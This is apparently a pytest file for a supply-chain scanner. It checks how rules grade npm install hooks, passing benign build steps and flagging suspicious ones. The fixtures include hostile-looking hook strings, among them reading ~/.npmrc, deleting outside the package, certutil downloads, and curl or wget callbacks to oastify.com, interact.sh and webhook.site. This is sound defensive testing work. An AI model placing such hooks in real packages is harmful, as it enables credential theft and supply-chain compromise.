"""Published packages' install hooks that run a popular build tool, the package's own install, a
file operation inside the package, or a message (review 98, the benign long tail's remaining
install-script blocks). The evasions keep the shape and change what actually runs."""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

import pytest

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.models import Severity

RULE = "SUSPECT.INSTALL.SCRIPT.001"


class HookKit:
    @staticmethod
    def findings(tmp_path: Path, scripts: dict[str, str], deps: dict[str, str] | None = None):
        manifest = {"name": "p", "version": "1.0.0", "scripts": scripts}
        if deps:
            manifest["dependencies"] = deps
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for name, text in (
                ("package/package.json", json.dumps(manifest)),
                ("package/index.js", "module.exports = 1;\n"),
            ):
                data = text.encode()
                info = tarfile.TarInfo(name)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        target = tmp_path / "p-1.0.0.tgz"
        target.write_bytes(buffer.getvalue())
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(target)
        return [f for f in result.findings if f.rule_id == RULE]


class TestBuildStepsAreNotBlocked:
    @pytest.mark.parametrize(
        ("scripts", "deps"),
        [
            ({"postinstall": "gulp"}, {"gulp": "^4.0.0"}),
            ({"install": "coffee -c ."}, {"coffee-script": "~1.12.0"}),
            (
                {"postinstall": "node_modules/.bin/webpack src/web.js > build/out.js"},
                {"webpack": "^5.0.0"},
            ),
            ({"postinstall": "umi generate tmp"}, {"umi": "^3.0.0"}),
            ({"postinstall": "npx jetify"}, {"jetifier": "^2.0.0"}),
            ({"postinstall": "cd client && npm install && cd .."}, None),
            ({"install": "(cd node_modules/theme && npm install)"}, None),
            ({"postinstall": "chmod u+x ffmpeg"}, None),
            ({"postinstall": "touch ./node_modules/marker"}, None),
            ({"postinstall": "rm -rf dist/"}, None),
            ({"postinstall": "cat index.json"}, None),
            ({"postinstall": "node -e \"console.log('installed! Run: npx setup-i18n')\""}, None),
        ],
    )
    def test_nothing_blocks(self, tmp_path: Path, scripts: dict, deps: dict | None) -> None:
        found = HookKit.findings(tmp_path, scripts, deps)
        assert all(f.severity < Severity.HIGH for f in found), [f.severity for f in found]

    def test_a_pack_hook_is_author_time(self, tmp_path: Path) -> None:
        found = HookKit.findings(tmp_path, {"postpack": 'rm -rf dist && node -e "x()"'})
        assert all(f.severity < Severity.HIGH for f in found)


STILL_BLOCKS = [
    # A declared dependency's command, when that dependency is not an established package.
    ({"postinstall": "bip40"}, {"bip40": "^1.0.0"}),
    # An interpreter shares a name with a popular package (`@types/node`): `vant`'s
    # compromised releases ran a file that is not in the package.
    ({"postinstall": "node lib/utils/support.js"}, {"@types/node": "^20.0.0"}),
    ({"postinstall": "bun x.ts"}, {"bun": "^1.0.0"}),
    # A popular tool's name, its package from somewhere other than the registry.
    ({"postinstall": "gulp"}, {"gulp": "github:someone/gulp"}),
    # A popular tool not declared at all: whatever is on PATH under that name runs.
    ({"postinstall": "webpack"}, None),
    # A popular tool whose output leaves the package.
    ({"postinstall": "gulp > ~/.profile"}, {"gulp": "^4.0.0"}),
    # Installing a named package is not the package's own install.
    ({"preinstall": "npm install some-helper"}, None),
    # A file made inside the package, then run.
    ({"postinstall": "chmod u+x tool && ./tool"}, None),
    # A file operation outside it.
    ({"postinstall": "touch ~/.marker"}, None),
    ({"postinstall": "rm -rf ../../src"}, None),
    ({"postinstall": "cat ~/.npmrc"}, None),
]
"""Hook shapes the rule grades HIGH; `TestWhatStillBlocks` asserts the rule's grade and the user's."""

HELD_BY_THE_VERDICT = {0}
"""Cases the package verdict holds as a warning on this minimal fixture (measured 2 Nov, verdict on): a
declared, non-established dependency's command. Marked strict, so a change that lifts it fails here
and the mark comes off (cordon-47: tests assert what the user sees)."""


class TestWhatStillBlocks:
    @pytest.mark.parametrize(
        ("scripts", "deps"),
        STILL_BLOCKS,
    )
    def test_blocks(self, tmp_path: Path, scripts: dict, deps: dict | None, verdict_off) -> None:
        # The rule's grade, with the package verdict off: a minimal synthetic package here is one
        # the verdict holds as a warning (pinned in test_verdict_features.py); this asserts the
        # rule still grades the hook HIGH, so a regression to MEDIUM cannot pass silently.
        found = HookKit.findings(tmp_path, scripts, deps)
        assert any(f.severity >= Severity.HIGH for f in found)

    @pytest.mark.parametrize(
        ("scripts", "deps"),
        [
            pytest.param(
                *case,
                marks=pytest.mark.xfail(
                    strict=True, reason="held as a warning by the package verdict"
                )
                if index in HELD_BY_THE_VERDICT
                else (),
            )
            for index, case in enumerate(STILL_BLOCKS)
        ],
    )
    def test_blocks_as_the_user_sees_it(
        self, tmp_path: Path, scripts: dict, deps: dict | None
    ) -> None:
        """The same shapes with the verdict on: the final grade a user's scan reports."""
        found = HookKit.findings(tmp_path, scripts, deps)
        assert any(f.severity >= Severity.HIGH for f in found)


class TestNetworkToolsInAnInstallHook:
    """MALWARE.INSTALL.NETWORK_PROBE.001 (external-mechanisms E1, GuardDog's install-hook rule in our own
    design): a network-probing tool a hook that runs on install invokes is an act, graded with the
    verdict on, as a user sees it. 0 of 36,231 benign packages' install hooks name one (every baseline
    manifest of a3b9c5f1). No build-runner exemption: `node-gyp rebuild && ping ...` is one prefix away."""

    PROBE = "MALWARE.INSTALL.NETWORK_PROBE.001"

    @staticmethod
    def scan(tmp_path: Path, scripts: dict[str, str]):  # type: ignore[no-untyped-def]
        HookKit.findings(tmp_path, scripts)  # writes the package
        return Scanner(Config.default().with_overrides(use_cache=False)).scan(
            tmp_path / "p-1.0.0.tgz"
        )

    @pytest.mark.parametrize(
        "scripts",
        [
            {"preinstall": "ping 10.0.0.1"},
            {"postinstall": "nslookup probe.example.test"},
            {"install": "dig probe.example.test"},
            {"postinstall": "powershell -c Get-Date"},
            {"postinstall": "certutil -urlcache -f u out.bin"},
            {"postinstall": "node-gyp rebuild && ping probe.example.test"},
        ],
    )
    def test_blocks_with_the_verdict_on(self, tmp_path: Path, scripts: dict) -> None:
        result = self.scan(tmp_path, scripts)
        probes = [f for f in result.findings if f.rule_id == self.PROBE]
        assert probes and all(f.severity >= Severity.HIGH for f in probes)

    @pytest.mark.parametrize(
        "scripts",
        [
            # The arcgis-rest-api-ts-d shape, the one benign the measure found: a publish-time hook.
            {"prepublish": "ping probe.example.test"},
            {"postinstall": "node index.js --host 0.0.0.0"},
            {"postinstall": "node index.js localhost"},
            {"postinstall": "echo ping the maintainers if this fails"},
        ],
    )
    def test_does_not_fire(self, tmp_path: Path, scripts: dict) -> None:
        result = self.scan(tmp_path, scripts)
        assert not [f for f in result.findings if f.rule_id == self.PROBE]


class TestAnInteractionHostInAScript:
    """MALWARE.EXFIL.SCRIPT_CALLBACK.001: a script of the package's own package.json names an
    interaction host (Destinations' list). 8 content misses in 4 groups, 0 benign newly blocked, on the
    root manifest of every npm unit of rows a3b9c5f1 (scratchpad jsm/pairn-hosts.txt; 6 in 2 groups
    in an install hook, the part that blocks). Graded with
    the verdict on, as a user sees it; the fixtures are strings nothing runs."""

    RULE = "MALWARE.EXFIL.SCRIPT_CALLBACK.001"

    @pytest.mark.parametrize(
        "scripts",
        [
            {"postinstall": "curl https://probe.oastify.com/x"},
            {"preinstall": "wget -q http://a.b.interact.sh"},
            {"install": "node t.js && curl webhook.site/abc"},
        ],
    )
    def test_blocks_with_the_verdict_on(self, tmp_path: Path, scripts: dict) -> None:
        result = TestNetworkToolsInAnInstallHook.scan(tmp_path, scripts)
        found = [f for f in result.findings if f.rule_id == self.RULE]
        assert len(found) == 1 and found[0].severity >= Severity.HIGH

    def test_a_script_a_person_runs_is_reported_below_the_gate(self, tmp_path: Path) -> None:
        # Repository grading option A: what a person runs warns; what installing runs blocks.
        result = TestNetworkToolsInAnInstallHook.scan(
            tmp_path, {"test": "node t.js && curl webhook.site/abc"}
        )
        found = [f for f in result.findings if f.rule_id == self.RULE]
        assert len(found) == 1 and found[0].severity < Severity.HIGH

    @pytest.mark.parametrize(
        "scripts",
        [
            {"postinstall": "curl https://example.com/x"},
            {"postinstall": "node install.js --registry https://oastify.com.example.net"},
            {"docs": "echo see the guide"},
        ],
    )
    def test_does_not_fire(self, tmp_path: Path, scripts: dict) -> None:
        result = TestNetworkToolsInAnInstallHook.scan(tmp_path, scripts)
        assert not [f for f in result.findings if f.rule_id == self.RULE]
